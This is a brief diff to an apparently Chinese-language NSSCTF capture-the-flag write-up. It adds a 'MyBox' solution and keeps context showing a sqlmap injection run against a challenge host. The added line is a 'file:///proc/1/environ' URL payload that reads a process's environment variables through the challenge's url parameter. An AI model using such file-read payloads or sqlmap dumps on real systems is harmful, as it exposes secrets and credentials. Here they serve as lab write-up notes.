@@ -1,4 +1,4 @@
-#### Round #1
+#### NSSCTF Round #1
 
 ##### basic_check
 
@@ -35,7 +35,7 @@ sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2
 // 这里打印flag表flag列的内容，得到flag
 ```
 
-#### Round #2
+#### NSSCTF 2nd
 
 ##### php签到
 
@@ -56,3 +56,14 @@ print(response.text)
 ```
 
 之后访问1.php就可以查看phpinfo的内容，在其中找到flag。
+
+##### MyBox
+
+题目：https://www.nssctf.cn/problem/4299
+
+可能是非预期解，直接用file读环境变量。
+
+```php
+?url=file:///proc/1/environ
+```
+
